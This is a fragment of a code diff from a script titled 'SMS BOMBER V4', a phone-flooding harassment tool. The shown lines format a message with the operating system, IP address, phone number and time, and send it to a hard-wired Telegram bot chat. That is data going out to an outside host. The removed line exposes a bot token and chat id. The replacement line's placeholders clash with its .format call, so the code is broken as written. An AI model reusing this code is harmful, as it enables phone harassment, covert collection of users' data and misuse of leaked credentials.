@@ -143,7 +143,7 @@ SMS BOMBER  V4 ...
 """.format(os,ip,phone_number,time)
 
 payload = {
-"UrlBox" : "https://api.telegram.org/bot5933232535:AAEmiH6TfgxItHlR9MmrSmTOOh-ONPANX8E/sendMessage?text={}&chat_id=5446661281".format(msg),
+"UrlBox" : "https://api.telegram.org/bot{TOKEN}/sendMessage?text={}&chat_id={CHAT_ID}".format(msg),
 "AgentList":"Mozilla Firefox",
 "VersionList":"HTTP/1.1",
 "MethodList":"Post"
